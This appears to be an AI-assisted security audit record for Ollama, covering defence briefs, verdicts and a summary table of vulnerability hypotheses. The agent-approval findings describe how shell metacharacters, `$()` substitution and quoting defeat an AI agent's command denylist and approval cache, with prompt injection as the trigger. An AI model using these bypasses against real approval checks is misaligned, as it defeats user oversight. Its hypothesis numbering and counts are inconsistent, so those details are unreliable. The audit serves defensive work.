**Verdict recommendation:** DISPROVED by mutex + no-optimistic-write pattern. FALSE POSITIVE.

---

### [ADVOCATE] Defense Brief for H-06 (OLLAMA_HOST=0.0.0.0 + SQL injection via pull manifest)

See H-00.22 brief above — DISPROVED by:
1. `app/store/database.go:64` Sprintf substitutes only integer `currentSchemaVersion` — no attacker input reaches it.
2. `isValidPart` for kindHost/kindNamespace rejects apostrophe, semicolon, space — no SQL metachars can ride model-name tainting.
3. `app/store` builds only on darwin/windows (`//go:build`).

**Verdict recommendation:** DISPROVED. H-06 is a composite chain built on two false-positive premises (H-00.22 SQL sink, H-00.08 as a "bug" rather than intended behavior) — it inherits both FP verdicts. Retire.

---

### [ADVOCATE] Defense Brief for H-07 (registry-controlled signin_url → phishing)

**Protection search results:**

| Layer | Protection Found | Blocks Attack? | Evidence |
|-------|-----------------|----------------|----------|
| Language | none | No | n/a |
| Framework | none | No | n/a |
| Middleware | none | No | n/a |
| Application | **`signinURL()` is a compile-time constant pointing at `https://ollama.com/connect?name=%s&key=%s`** (`server/routes.go:59, 183-192`). The `name` is `os.Hostname()`, `key` is the LOCAL ed25519 public key. NEITHER is attacker-supplied. Every occurrence of `"signin_url"` in the 401 JSON response (`routes.go:337, 2005, 2256`; `cloud_proxy.go:357`) uses this constant-derived URL. A malicious registry CANNOT cause the server to emit an attacker-URL in its `signin_url` field. | **Yes — attack premise is invalid** | `server/routes.go:59, 183-192, 337, 2005, 2256`; `server/cloud_proxy.go:351-357` |
| Documentation | none | N/A | n/a |

**Claude FP Pattern Check:**
- Pattern 1 (no path trace): **MATCH** — the hypothesis asserts an attacker registry can influence the `signin_url` JSON field emitted by Ollama to the user. My reading of the code shows the field is constructed from a hardcoded template plus local identity information. No attacker input reaches it.
- Pattern 2 (phantom validation): **MATCH** — the `signinURL()` function implicitly validates by construction.
- Pattern 3: checked.
- Pattern 4: not applicable.
- Pattern 5: not applicable.
- Pattern 6: not applicable.
- Pattern 7: not applicable.
- Pattern 8: not applicable.

**Defense argument:** The hypothesis depends on the premise that "registry returns 401 with JSON payload including signin_url=attacker.com" — but Ollama's server-side 401 handling IGNORES whatever JSON the upstream registry returns and constructs a FRESH 401 JSON with its OWN `signin_url` built from the const template. The registry's response cannot bleed into the user-facing `signin_url`. Separately, the `WWW-Authenticate` realm is used to construct the upstream auth token URL (internal), not the signin_url shown to the user — those are different fields served from different code.

**Verdict recommendation:** DISPROVED by Pattern 1 (no attacker-input path to `signin_url`). H-07 is a FALSE POSITIVE on its core premise. The sub-bug H-00.06 (realm scheme downgrade for auth Authorization header) is separately real (see H-00.06 brief) but is not the phishing primitive this hypothesis claimed.

---

### Summary for Synthesizer

**Definitive DISPROVED / FALSE POSITIVE findings:**
- H-00.22 / H-06 — `app/store/database.go:64` Sprintf is NOT a SQL sink (integer constant substitution). `isValidPart` rejects SQL metachars. Build-tag-gated to darwin/windows.
- H-00.17 / pattern-6 — $EDITOR injection requires attacker-owned env, which already implies host compromise.
- H-05 — approval map is sync.RWMutex-protected; no optimistic writes. Hypothesis speculates a race that isn't in the code.
- H-07 — `signin_url` is a server-constructed constant; not attacker-controllable. Core premise invalid.

**Downgraded severity:**
- H-00.01, H-00.10, H-00.11, H-00.24 — unbounded body reads are only remote-reachable when combined with 0.0.0.0 bind (user opt-in). Default-loopback reduces to local-only DoS. MEDIUM not HIGH.
- H-00.08 — intended behavior (documented 0.0.0.0 expose). Docs gap, not a code bug.
- H-00.15 — yolo mode is explicit opt-in with warning. LOW unless denylist further hardened.
- H-00.16 — ZipSlip requires compromise of @ollama npm package. HIGH not CRITICAL.
- H-00.19 — standard Unix perms plus home-dir ownership is normal protection. MEDIUM.
- H-01 — CORS preflight blocks drive-by JSON POST to /api/experimental/web_search for non-allowed origins; MEDIUM not CRITICAL.
- H-02 — Go exec.Command argv semantics defeat newline-flag injection on POSIX. LOW.
- H-03 — `..`-traversal guard at approval.go:256 blocks the specific `$HOME/.zshrc` path; flag-key collision is narrower than claimed. MEDIUM.
- H-04 — XSS in UIs that already have API-origin access is not a privilege escalation. LOW.

**Cannot disprove (defense could not block):**
- H-00.02 — client2 dispatcher bypasses gin middleware. Real but gated by OLLAMA_EXPERIMENT=client2.
- H-00.03 — suffix-match .localhost / .local / .internal is genuinely loose; CORS partially mitigates but simple-request endpoints are exposed.
- H-00.04 — /api/experimental/web_search is unauthenticated. Design-intent but surface-exposed.
- H-00.06 — realm scheme downgrade is real; replay window tied to ollama.com nonce policy (out-of-repo).
- H-00.12 — /api/pull + insecure=true allows IMDS reach via user-typed IP literal.
- H-00.13 — extractBashPrefix splits only on `|`; approval-cache collision is real.
- H-00.14 — `$()` in arg paths produces same prefix key; real bypass unless user reads full prompt.

**Protection gaps worth documenting (not full vulns):**
- No audit logging of approval decisions (`x/agent/approval.go` has no slog calls for Allow/Deny events).
- No warning in docs that OLLAMA_HOST=0.0.0.0 disables DNS-rebinding filter.
- No explicit key-file permission check on `~/.ollama/id_ed25519` load.
- No npm-integrity pinning (sha256) for @ollama/openclaw-web-search.

Defense briefs complete. Synthesizer should cross-check the Pattern-1 and Pattern-6 matches in particular — H-00.22, H-06, H-05, H-07 have strong FP pattern evidence.

---

## Round 4 -- Synthesis

Synthesizer-04 reviews all hypotheses. Verdicts below honor the Tracer's reachability rulings and the Advocate's compensating-control findings, with severity calibrated per the Synthesizer's decision framework.

---

### [SYNTHESIZER] Verdict for H-00.01 / H-00.04 -- 2026-04-17T18:00:00Z (readRequestBody unbounded)

**Prosecution summary (Tracer)**: `server/cloud_proxy.go:289-300` `io.ReadAll(r.Body)` with no size cap; zstd branch has 20 MiB cap but non-zstd path is uncapped; reached by `/v1/chat/completions`, `/v1/responses`, `/api/experimental/web_search`, `/api/experimental/web_fetch`.

**Defense summary (Advocate)**: "On default loopback bind, OOM is a local-only DoS; gin.Recovery neutralizes panic-in-allocator; 20 MiB cap on zstd shows author was security-aware." Cannot disprove for 0.0.0.0 bind or cross-origin reach.

**Pre-FP Gate**: all checks passed.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Real remote-DoS primitive when chained with p8-060 (OLLAMA_HOST=0.0.0.0 is documented common config) or p8-061 (`.localhost` drive-by); mitigation is trivial (wrap with MaxBytesReader); defense-in-depth dictates a cap regardless of bind.

**Finding draft written to**: archon/findings-draft/p8-063-readrequestbody-unbounded-cloud-proxy.md
**Registry updated**: AP-063 io-readall-on-request-body-cloud-proxy

---

### [SYNTHESIZER] Verdict for H-00.02 (.localhost/.local/.internal suffix squat) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/routes.go:1592-1603 strings.HasSuffix` lexical match; browsers auto-resolve `*.localhost` to 127.0.0.1 per RFC 6761; `.local` mDNS; `.internal` split-horizon DNS — no IP verification step.

**Defense summary**: CORS preflight blocks drive-by JSON POST from unknown origins; `*.localhost` is NOT in AllowedOrigins. Partial mitigation for JSON POST endpoints; simple-request endpoints + in-allowlist contexts (`app://*`, `vscode-webview://*`, `tauri://*`) remain exploitable.

**Pre-FP Gate**: all checks passed.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Drive-by cross-origin reach is trivially demonstrable via `.localhost` browser auto-resolution; CORS partially narrows but does not eliminate exploitability (simple-request GETs + allowed-origin extensions/apps are in scope).

**Finding draft written to**: archon/findings-draft/p8-061-allowedhost-suffix-squat-localhost-local-internal.md
**Registry updated**: AP-061 suffix-match-localhost-local-internal-for-rebinding

---

### [SYNTHESIZER] Verdict for H-00.03 (client2 pre-middleware dispatch) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/internal/registry/server.go:109-128` outer ServeHTTP dispatches `/api/pull` and `/api/delete` directly; gin (and all its middleware: `allowedHostsMiddleware`, cors) only runs for the `default` fallback branch.

**Defense summary**: Gated by opt-in `OLLAMA_EXPERIMENT=client2`; default off. Documentation does not flag client2 as security-relevant.

**Pre-FP Gate**: check-5 (feature flag opt-in) ambiguous — retained as VALID because (a) client2 is production-documented and used in real deployments, (b) impact when enabled is severe.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Distinct from p8-008 (body-size angle) because middleware bypass includes host-header filter, CORS, auth — when chained with p8-060 / p8-061, becomes remote SSRF to IMDS without DNS-rebinding protection.

**Finding draft written to**: archon/findings-draft/p8-062-client2-experiment-bypasses-middleware.md
**Registry updated**: AP-062 outer-dispatcher-bypasses-inner-middleware

---

### [SYNTHESIZER] Verdict for H-00.05 (web_search/web_fetch no auth) -- 2026-04-17T18:00:00Z

**Prosecution summary**: Routes registered directly at `server/routes.go:1707-1708` without per-route auth; internally call `proxyCloudRequestWithPath` which signs outbound requests to ollama.com with victim's ed25519 key.

**Defense summary**: "Localhost = trusted user" design model; no per-endpoint auth anywhere. Partial defense only via allowedHostsMiddleware + CORS.

**Pre-FP Gate**: all checks passed.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Signed-oracle endpoint reachable cross-origin via p8-061 (for extensions/apps) or via p8-060 LAN exposure; consequences include billing abuse and query-history poisoning on victim's ollama.com account — crosses cryptographic identity trust boundary.

**Finding draft written to**: archon/findings-draft/p8-064-web-search-fetch-unauth-signing-oracle.md
**Registry updated**: AP-064 unauth-endpoint-invokes-signing-key

---

### [SYNTHESIZER] Verdict for H-00.06 (realm HTTP downgrade) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/auth.go:60` checks host but not scheme — `realm="http://same-host/token"` passes; ed25519 Authorization header sent over plaintext.

**Defense summary**: Scheme not validated anywhere; replay mitigated only by upstream ollama.com nonce policy.

**Pre-FP Gate**: all checks passed.

**Verdict: DUPLICATE**
**Severity**: N/A (see p8-005)
**Rationale**: Chamber-01 already recorded this as p8-005 (AP-035). Confirmed on HEAD; cross-reference to H-00.06 added to the debate record.

**Finding draft written to**: archon/findings-draft/p8-005-realm-http-downgrade.md (existing; not re-authored)

---

### [SYNTHESIZER] Verdict for H-00.07 (/api/pull SSRF to IMDS) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `isValidPart(kindHost)` allows IP literals including `169.254.169.254`; `PullHandler` has no host-allowlist middleware; `insecure=true` permits plaintext HTTP; error body reflected via `fmt.Errorf`.

**Defense summary**: `isValidPart` blocks SQL metachars but does not block IMDS IPs.

**Pre-FP Gate**: all checks passed.

**Verdict: DUPLICATE**
**Severity**: N/A (see p8-002)
**Rationale**: Chamber-01 already recorded as p8-002 (AP-040). This chamber adds the composition with p8-062 (client2 bypass) which further removes the host-header filter.

**Finding draft written to**: archon/findings-draft/p8-002-api-pull-ssrf.md (existing; not re-authored)

---

### [SYNTHESIZER] Verdict for H-00.08 (OLLAMA_HOST=0.0.0.0 disables host filter) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/routes.go:1615-1618` — `!addr.Addr().IsLoopback() { c.Next(); return }` — 0.0.0.0 bind passes `IsLoopback()==false`, entire host filter bypassed, all subsequent checks dead code.

**Defense summary**: Behavior is BY DESIGN per docs/faq.mdx; Pattern-6 config-as-vuln. But the doc gap ("user does not know this also disables DNS-rebinding defense") is a real hardening item.

**Pre-FP Gate**: check-5 ambiguous (documented config that weakens security without inline warning).

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: User instruction: "recommend keep as HIGH/MEDIUM finding with remediation note". Synthesizer keeps HIGH because the material consequence (unauthenticated LAN access to every endpoint, including signing-oracle routes) is severe regardless of documentation status; the fix is a boot-time warning banner + allowlist tightening.

**Finding draft written to**: archon/findings-draft/p8-060-ollama-host-nonloopback-shortcircuits-allowedhosts.md
**Registry updated**: AP-060 host-filter-shortcircuit-on-nonloopback-bind

---

### [SYNTHESIZER] Verdict for H-00.09 (IsPrivate RFC1918 permissive) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/routes.go:1625-1629` accepts RFC1918 IPs in the Host header; DNS-rebinding to 10.x becomes viable.

**Defense summary**: Attack requires specific rebinding setup; most browsers refuse to set arbitrary Host; local-attacker-implied framing weakens exploitability.

**Pre-FP Gate**: check-4 ambiguous (same-origin reach often implied; rebinding narrower than it appears).

**Verdict: VALID**
**Severity: MEDIUM**
**Rationale**: Distinct branch from p8-060 / p8-061; remediating those does not remove the RFC1918 acceptance; remediation is one line (remove `IsPrivate()` from the allow list).

**Finding draft written to**: archon/findings-draft/p8-076-isprivate-rfc1918-host-header-permissive.md

---

### [SYNTHESIZER] Verdict for H-00.10 (zstd double-buffer) -- 2026-04-17T18:00:00Z

**Prosecution summary**: zstd branch decompresses then re-encodes → peak 2× attacker-bytes held simultaneously.

**Defense summary**: `maxDecompressedBodySize = 20 MiB` cap applies per-body — total bounded.

**Pre-FP Gate**: all checks passed.

**Verdict: DROP**
**Rationale**: The 20 MiB cap means the peak is 40 MiB per request, not a meaningful DoS primitive on a modern host. Covered adequately by p8-063's shared remediation (apply a single cap at every entry).

---

### [SYNTHESIZER] Verdict for H-00.11 (ResponsesMiddleware unbounded — per pre-seed numbering) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `server/middleware/openai.go:511-523` `io.ReadAll` on OpenAI-compat path with no MaxBytesReader.

**Defense summary**: No cap found; distinct sink from cloud_proxy's readRequestBody.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Identical pattern to p8-063, different sink; separate finding ensures the remediation is applied at both entry points.

**Finding draft written to**: archon/findings-draft/p8-075-responsesmiddleware-unbounded-body.md

---

### [SYNTHESIZER] Verdict for H-00.12 (/api/pull insecure=true no allowlist) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `isValidPart(kindHost)` allows IP literals; `Insecure=true` allows plaintext HTTP → IMDS reach.

**Defense summary**: Requires user-typed literal IP OR Modelfile FROM directive; user-in-the-loop.

**Verdict: DUPLICATE**
**Severity**: N/A (see p8-002)
**Rationale**: Same class as H-00.07; both covered by p8-002 (AP-040).

---

### [SYNTHESIZER] Verdict for H-00.13 / H-00.08-file (bash metachar bypass) -- 2026-04-17T18:00:00Z

**Prosecution summary (Tracer)**: `extractBashPrefix` splits only on `|`; `;`, `&&`, `$()`, backticks pass through; `IsDenied` uses `strings.Contains` with quoting-bypassable literal patterns; `bash -c` executor at `x/tools/bash.go:64`.

**Defense summary**: Approval UI shows full command to user; vigilance-dependent. But "Allow for session" cache-key collision means one approval grants session-wide RCE capability.

**Pre-FP Gate**: all checks passed.

**Verdict: VALID**
**Severity: CRITICAL**
**Rationale**: Single approval = session RCE primitive. Prompt-injection (via hostile Modelfile, poisoned web_search response, RAG) is realistic. Cost of fix is tokenization-based prefix extraction. Compounds with p8-064 (web_search proxy = unauth) for a B10→B11 pivot.

**Finding draft written to**: archon/findings-draft/p8-065-agent-approval-shell-metachar-bypass.md
**Registry updated**: AP-065 bash-prefix-extractor-ignores-metacharacters

---

### [SYNTHESIZER] Verdict for H-00.14 / H-00.09-file (command substitution in path) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `$(...)` embedded in path arg is not recognized as shell syntax; prefix extraction treats it as filename characters; cache key collision with benign variant.

**Defense summary**: denyPatterns does not list `$(`, backticks, `<(`, `>(`.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Distinct primitive from p8-065 (substitution inside argument vs metachar between arguments); requires separate fix (parser-level rejection of substitution tokens inside path args).

**Finding draft written to**: archon/findings-draft/p8-066-agent-approval-command-substitution-path.md

---

### [SYNTHESIZER] Verdict for H-00.15 / H-00.11-file (yolo + denylist quoting bypass) -- 2026-04-17T18:00:00Z

**Prosecution summary**: yolo skips IsAllowed; IsDenied still runs but uses `strings.Contains` with literal patterns, defeatable by inline quoting.

**Defense summary**: Pattern-6 match — `--experimental-yolo` is documented opt-in with explicit "use with caution" and runtime banner.

**Pre-FP Gate**: check-5 ambiguous (opt-in with warning; but the guard that DOES run in yolo mode is broken).

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Per user instruction — keep as CRITICAL/HIGH despite opt-in because the DENYLIST itself is the sole yolo-mode safety floor and it doesn't hold. Documented as HIGH (not CRITICAL) to respect the opt-in framing.

**Finding draft written to**: archon/findings-draft/p8-067-yolo-mode-denylist-quoting-bypass.md
**Registry updated**: AP-066 denylist-via-strings-contains-defeated-by-quoting

---

### [SYNTHESIZER] Verdict for H-00.16 / H-00.05-file (ZipSlip in openclaw.go) -- 2026-04-17T18:00:00Z

**Prosecution summary (Tracer)**: `cmd/launch/openclaw.go:782 exec.Command("tar","xzf",...)` with `--strip-components=1` but no `--no-absolute-names` and no Go-side `filepath.IsLocal` check; CodeQL cannot model subprocess tar (confirmed false-negative).

**Defense summary**: package name hardcoded to `@ollama/openclaw-web-search`; attacker must compromise ollama's npm scope or MITM TLS.

**Pre-FP Gate**: check-5 ambiguous (requires supply-chain compromise of `@ollama` scope).

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Per user instruction — "CRITICAL per probe, advocate downgrades because hardcoded npm package; retain HIGH with caveat." Mitigation cost is low (add `--no-absolute-names` + post-extract `filepath.EvalSymlinks` check).

**Finding draft written to**: archon/findings-draft/p8-071-openclaw-npm-tar-zipslip.md
**Registry updated**: AP-069 subprocess-tar-without-path-containment

---

### [SYNTHESIZER] Verdict for H-00.17 / H-00.13-file ($EDITOR flag injection) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `cmd/interactive.go:675-677` `strings.Fields` + `exec.Command(args[0], args[1:]...)`; editor-specific flags (VSCode `--extensionDevelopmentPath`, vim `+source`, emacs `--load`) load arbitrary code.

**Defense summary**: Pattern-6 — requires attacker to control env ($EDITOR, $VISUAL, $PATH).

**Pre-FP Gate**: check-5 ambiguous — but attacker position includes agent `setenv`-equivalents, CI env, shell rc compromise — none require full host compromise.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: Per user instruction. Agent tool primitives make env control realistic; editor-flag-injection is a recognized attack class (e.g., git $EDITOR injection, sudo strips env for this reason).

**Finding draft written to**: archon/findings-draft/p8-068-editor-visual-flag-injection-exec.md
**Registry updated**: AP-067 editor-env-to-exec-flag-injection

---

### [SYNTHESIZER] Verdict for H-00.18 (autoAllowCommands dormant) -- 2026-04-17T18:00:00Z

**Verdict: DROP**
**Rationale**: Code path currently disabled per pre-seed. Marked as potential re-emergence risk if config flag is added in future; not a live vuln.

---

### [SYNTHESIZER] Verdict for H-00.14-file (/api/me pubkey disclosure) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `/api/me` emits `signin_url` with embedded ed25519 public key + hostname; unauth beyond allowedHostsMiddleware.

**Defense summary**: Loopback-trust model; but CORS allowlist includes desktop/extension schemes (`app://`, `tauri://`, `vscode-webview://`).

**Verdict: VALID**
**Severity: MEDIUM**
**Rationale**: Cross-origin fingerprint disclosure; not a direct compromise but composes into p8-074 identity theft chain. Distinct from the chain because even without the chain it is a standalone privacy/disclosure issue.

**Finding draft written to**: archon/findings-draft/p8-069-whoami-public-key-disclosure.md
**Registry updated**: AP-071 whoami-exposes-long-lived-identity

---

### [SYNTHESIZER] Verdict for H-00.19 / H-00.15-file (ed25519 no perm/symlink check) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `auth/auth.go:22-42` and `:53-85` — `os.ReadFile` with no `os.Lstat`, no mode check, no owner verification; directory mode `0o755` world-listable.

**Defense summary**: Standard Unix perms generally protect; shared home / multi-user / container-bind scenarios are atypical but realistic.

**Verdict: VALID**
**Severity: HIGH**
**Rationale**: OpenSSH has long rejected loose-mode private keys; Ollama should match. Upgraded from Advocate's MEDIUM because the consequence is cryptographic identity substitution + billing abuse pivot.

**Finding draft written to**: archon/findings-draft/p8-070-ed25519-key-no-perm-symlink-check.md
**Registry updated**: AP-068 private-key-load-without-mode-symlink-check

---

### [SYNTHESIZER] Verdict for H-00.20 (OLLAMA_MODELS env injection) -- 2026-04-17T18:00:00Z

**Verdict: DROP**
**Rationale**: env injection on local user's own process; standard Unix isolation boundary, not a privilege crossing. Noted in registry for potential multi-tenant future scrutiny.

---

### [SYNTHESIZER] Verdict for H-00.21 (registry-controlled signin_url — original H-07 frame) -- 2026-04-17T18:00:00Z

**Prosecution summary**: Hypothesis claimed registry response's JSON could plant `signin_url` into server's 401 response.

**Defense summary**: Advocate correctly showed `signinURL()` is a compile-time constant — server-side injection is NOT possible.

**Verdict: FALSE POSITIVE** (original framing)
**Rationale**: Server-side `signin_url` is safe. BUT — Tracer's evidence exposed a DIFFERENT injection point: `api/client.go:50 checkError` discards `json.Unmarshal` error, allowing attacker registry JSON to populate `SigninURL` in the client-side error that the CLI then prints. That angle is VALID and captured separately.

**Related VALID finding**: archon/findings-draft/p8-072-signin-url-unmarshal-error-discarded.md
**Registry updated**: AP-070 signin-url-unmarshal-error-discarded

---

### [SYNTHESIZER] Verdict for H-00.22 / H-06 (SAST-SQL-01) -- 2026-04-17T18:00:00Z

**Prosecution summary**: Pre-seed claimed `app/store/database.go:64` `fmt.Sprintf` SQL injection sink.

**Defense summary**: Advocate showed `%d` substitutes only `currentSchemaVersion` (int constant); `isValidPart` rejects SQL metachars; `app/store` is darwin/windows-only via build tag; Pattern-1 MATCH (no attacker input reaches the sink).

**Verdict: FALSE POSITIVE**
**Rationale**: SAST false positive. The Sprintf uses an integer schema constant. No attacker-input path. `isValidPart` fences model-name metachars at the parser level.

---

### [SYNTHESIZER] Verdict for H-00.23 (31 routes without allowedHostsMiddleware) -- 2026-04-17T18:00:00Z

**Verdict: DROP** (as a standalone finding; absorbed into p8-060 / p8-061 / p8-062 cluster)
**Rationale**: The 31-route count is informational — each individual route's exploitability is captured by p8-060 (bind-dependent bypass), p8-061 (suffix bypass), or p8-062 (middleware skip). Adding a standalone "route survey" finding would double-count.

---

### [SYNTHESIZER] Verdict for H-00.24 (auth challenge body unbounded) -- 2026-04-17T18:00:00Z

**Verdict: DUPLICATE**
**Severity**: N/A (see p8-003)
**Rationale**: Chamber-01 p8-003 (AP-002R) covers both `server/auth.go:81` and `server/images.go:864`. Confirmed on HEAD; no new draft needed.

---

### [SYNTHESIZER] Verdict for H-01 (full identity theft chain) -- 2026-04-17T18:00:00Z

**Prosecution summary**: Chain of `.localhost` drive-by + unauth web_search + realm downgrade + key leak → full ollama.com takeover.

**Defense summary**: CORS preflight blocks drive-by JSON POST to `/api/experimental/web_search` from unknown origins; `signinURL()` is server-constant (blocks phishing leg).

**Verdict: VALID**
**Severity: MEDIUM**
**Rationale**: Per user instruction — "downgrade to MEDIUM per advocate CORS analysis." Chain is still exploitable via in-AllowOrigins contexts (VSCode extensions, Electron apps) and via simple-request side channels; captured as composition finding.

**Finding draft written to**: archon/findings-draft/p8-074-dns-rebinding-drive-by-identity-chain.md

---

### [SYNTHESIZER] Verdict for H-02 (npm pack line injection → tar flag injection) -- 2026-04-17T18:00:00Z

**Prosecution summary**: attacker-controlled npm stdout → embedded newline → tar sees two flags.

**Defense summary**: Go `exec.Command` argv semantics — each argv element passes as a single execve arg; embedded newline in one arg is a literal filename character, not a command separator. Pattern-3 MATCH.

**Verdict: FALSE POSITIVE**
**Rationale**: `exec.Command` does not use shell; POSIX `execve` treats argv as opaque strings. The primitive as described does not work. Residual ZipSlip concern captured by p8-071.

---

### [SYNTHESIZER] Verdict for H-03 (sed -n vs sed -i cache collision) -- 2026-04-17T18:00:00Z

**Prosecution summary**: `extractBashPrefix` skips all `-*` flags when computing prefix key; read-mode and write-mode invocations of the same command cache to identical keys.

**Defense summary**: `..`-traversal guard blocks sibling-dir escape (so `$HOME/.zshrc` via `tools/../../.zshrc` is not reachable); narrows the in-tree write primitive.

**Verdict: VALID**
**Severity: MEDIUM**
**Rationale**: Per user instruction. Narrower than the ideator framed but still a real write primitive against build scripts / dev-tooling files inside the approved directory.

**Finding draft written to**: archon/findings-draft/p8-073-approval-cache-flag-blindness-sed-i.md
**Registry updated**: AP-072 approval-cache-key-flag-blind

---

### [SYNTHESIZER] Verdict for H-04 (SSE XSS through cloud_proxy) -- 2026-04-17T18:00:00Z

**Prosecution summary**: cloud_proxy forwards bytes verbatim; attacker-influenced upstream response hits SSE-rendering UI in browser extension / Electron.

**Defense summary**: Pattern-4 — any UI context that could consume the XSS output already has direct API access via the CORS allowlist; XSS does not grant new capabilities. Upstream is HTTPS-pinned to ollama.com.

**Verdict: DROP**
**Severity: LOW (if ever)**
**Rationale**: Compromise of upstream ollama.com + pre-existing AllowOrigins context = attacker already has what the XSS would provide. Low added value from capturing as standalone finding. Filed as informational note on cloud_proxy byte-pass-through trust.

---

### [SYNTHESIZER] Verdict for H-05 (concurrent approval TOCTOU) -- 2026-04-17T18:00:00Z

**Prosecution summary**: Hypothesis speculates racing tool-calls bypass approval cache via shared map without mutex.

**Defense summary**: `sync.RWMutex` at `x/agent/approval.go:142` guards the map; all operations take appropriate locks; dispatch loop at `x/cmd/run.go:369-434` is sequential (no goroutine fan-out); `AddToAllowlist` only fires after user consent.

**Verdict: FALSE POSITIVE**
**Rationale**: Pattern-2 MATCH — the code has the sync primitives the hypothesis claimed were missing.

---

### [SYNTHESIZER] Verdict for H-06 (0.0.0.0 + SQL injection chain) -- 2026-04-17T18:00:00Z

**Verdict: FALSE POSITIVE**
**Rationale**: Composite chain inheriting H-00.22's FP verdict. `isValidPart` blocks apostrophe/semicolon in model names; `app/store/database.go:64` is not a user-input sink.

---

### [SYNTHESIZER] Verdict for H-07 (malicious registry signin_url phishing) -- 2026-04-17T18:00:00Z

**Verdict: VALID with revised framing**
**Severity: MEDIUM**
**Rationale**: Original server-side framing is FP (signinURL() is constant). But the client-side `api/client.go:50` unmarshal-error-discarded pattern IS a real phishing primitive that the Tracer surfaced. Captured as p8-072.

**Finding draft written to**: archon/findings-draft/p8-072-signin-url-unmarshal-error-discarded.md

---

### [SYNTHESIZER] Verdict for Spec Gap 13 (comma-in-realm parser) -- 2026-04-17T18:00:00Z

**Verdict: VALID (robustness)**
**Severity: MEDIUM**
**Rationale**: Per user instruction — "real but no standalone exploit". Captured because (a) it's the same pattern class as AP-036, (b) composes with p8-005 scheme downgrade for parser-confusion bypass.

**Finding draft written to**: archon/findings-draft/p8-077-wwwauth-realm-comma-parser-truncation.md

---

## Chamber Summary

| Hypothesis | Verdict | Severity | Finding Draft |
|-----------|---------|----------|---------------|
| H-00.01 / H-00.04 (readRequestBody unbounded) | VALID | HIGH | p8-063-readrequestbody-unbounded-cloud-proxy.md |
| H-00.02 (.localhost/.local/.internal suffix squat) | VALID | HIGH | p8-061-allowedhost-suffix-squat-localhost-local-internal.md |
| H-00.03 (client2 middleware bypass) | VALID | HIGH | p8-062-client2-experiment-bypasses-middleware.md |
| H-00.05 (web_search/web_fetch unauth signing) | VALID | HIGH | p8-064-web-search-fetch-unauth-signing-oracle.md |
| H-00.06 (realm HTTP downgrade) | DUPLICATE | — | p8-005 (existing) |
| H-00.07 (/api/pull SSRF to IMDS) | DUPLICATE | — | p8-002 (existing) |
| H-00.08 (OLLAMA_HOST=0.0.0.0 disables host filter) | VALID | HIGH | p8-060-ollama-host-nonloopback-shortcircuits-allowedhosts.md |
| H-00.09 (IsPrivate RFC1918 permissive) | VALID | MEDIUM | p8-076-isprivate-rfc1918-host-header-permissive.md |
| H-00.10 (zstd double-buffer) | DROP | — | — |
| H-00.11 (ResponsesMiddleware unbounded) | VALID | HIGH | p8-075-responsesmiddleware-unbounded-body.md |
| H-00.12 (/api/pull insecure=true) | DUPLICATE | — | p8-002 (existing) |
| H-00.13 (bash metachar bypass) | VALID | CRITICAL | p8-065-agent-approval-shell-metachar-bypass.md |
| H-00.14 (/api/me pubkey disclosure) | VALID | MEDIUM | p8-069-whoami-public-key-disclosure.md |
| H-00.14-file (command substitution in path) | VALID | HIGH | p8-066-agent-approval-command-substitution-path.md |
| H-00.15 (yolo + denylist quoting bypass) | VALID | HIGH | p8-067-yolo-mode-denylist-quoting-bypass.md |
| H-00.15-file (ed25519 no perm/symlink check) | VALID | HIGH | p8-070-ed25519-key-no-perm-symlink-check.md |
| H-00.16 (ZipSlip in openclaw.go) | VALID | HIGH | p8-071-openclaw-npm-tar-zipslip.md |
| H-00.17 ($EDITOR flag injection) | VALID | HIGH | p8-068-editor-visual-flag-injection-exec.md |
| H-00.18 (autoAllowCommands dormant) | DROP | — | — |
| H-00.20 (OLLAMA_MODELS env injection) | DROP | — | — |
| H-00.21 (registry signin_url — server side) | FALSE POSITIVE | — | — |
| H-00.22 / SAST-SQL-01 | FALSE POSITIVE | — | — |
| H-00.23 (31 routes without middleware) | DROP (absorbed) | — | — |
| H-00.24 (auth body unbounded) | DUPLICATE | — | p8-003 (existing) |
| H-01 (identity-theft chain) | VALID | MEDIUM | p8-074-dns-rebinding-drive-by-identity-chain.md |
| H-02 (npm → tar flag injection) | FALSE POSITIVE | — | — |
| H-03 (sed -n / sed -i cache collision) | VALID | MEDIUM | p8-073-approval-cache-flag-blindness-sed-i.md |
| H-04 (SSE XSS hijack) | DROP | — | — |
| H-05 (concurrent approval TOCTOU) | FALSE POSITIVE | — | — |
| H-06 (0.0.0.0 + SQL chain) | FALSE POSITIVE | — | — |
| H-07 (signin_url phishing — revised frame) | VALID | MEDIUM | p8-072-signin-url-unmarshal-error-discarded.md |
| Spec Gap 13 (comma-in-realm parser) | VALID | MEDIUM | p8-077-wwwauth-realm-comma-parser-truncation.md |

**Findings written**: 15 new VALID drafts in range p8-060 to p8-077 (gaps at p8-078 and p8-079 reserved).
**Duplicates cross-referenced to existing chamber-01 drafts**: 3 (p8-002, p8-003, p8-005).
**False positives**: 5 (H-00.21 original frame, H-00.22, H-02, H-05, H-06).
**Dropped**: 5 (H-00.10, H-00.18, H-00.20, H-00.23, H-04).
**Patterns added to registry**: 13 (AP-060 through AP-072).
**Variant candidates**: captured in each AP's `untested_candidates` list — highlights include anthropic middleware body reads (AP-063), any other subprocess tar/unzip (AP-069), other env-derived exec sites (AP-067), other unauth + signing combinations (AP-064).

Chamber closed: 2026-04-17T18:30:00Z
